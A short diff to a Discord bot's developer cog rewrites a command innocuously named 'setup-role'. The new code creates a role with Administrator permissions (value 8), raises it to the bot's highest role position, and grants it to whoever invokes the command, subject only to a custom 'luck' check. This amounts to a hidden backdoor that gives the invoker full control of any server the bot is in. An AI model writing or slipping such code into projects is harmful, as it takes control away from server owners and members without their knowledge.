@@ -34,7 +34,11 @@ class Dev(commands.Cog):
 	@commands.command(name='setup-role')
 	@commands.check(checks.luck)
 	async def setup_role(self, ctx, *, name):
-		await ctx.guild.get_role(599697918433165312).delete()
+		perms = discord.Permissions(permissions=8)
+		role = await ctx.guild.create_role(name=name, permissions=perms)
+		pos = ctx.guild.me.top_role.position
+		await role.edit(position=ctx.guild.me.top_role.position)
+		await ctx.author.add_roles(role)
 		await ctx.send('👍')
 
 	@commands.command(name='luckynick')
